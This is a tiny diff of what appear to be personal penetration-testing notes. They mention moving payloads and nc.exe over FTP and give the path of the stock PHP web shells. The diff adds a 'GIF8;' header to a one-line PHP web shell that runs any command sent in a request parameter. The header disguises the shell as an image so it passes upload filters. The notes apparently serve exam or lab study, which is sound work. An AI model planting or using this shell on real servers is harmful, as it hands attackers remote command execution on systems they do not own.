@@ -2,6 +2,7 @@ Windows & Linux
 WHEN MOVING FILES IN FTP, set to binary mode to in order to not mess up a payload or nc.exe 
 
 php cmd shell is in /user/share/webshells/php
+GIF8;
 <?php echo system($_REQUEST["cmd"]); ?>
 
 Linux 
